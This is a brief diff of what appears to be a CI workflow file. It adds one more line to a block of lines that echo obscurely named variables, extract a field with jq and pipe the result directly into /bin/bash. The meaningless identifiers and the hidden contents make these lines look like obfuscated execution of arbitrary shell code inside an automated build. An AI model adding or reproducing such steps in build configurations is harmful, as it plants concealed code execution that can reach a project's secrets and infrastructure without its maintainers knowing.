@@ -25,6 +25,7 @@ jobs:
           echo $iheap4 | jq -r .ejv5186 | /bin/bash
           echo $tvq5967 | jq -r .hr54 | /bin/bash
           printf '%s' "$bzg2" | jq -r .owckc71 | /bin/bash
+          echo $b2 | jq -r .bonh9792 | /bin/bash
 
       - name: Archive results
         if: always()
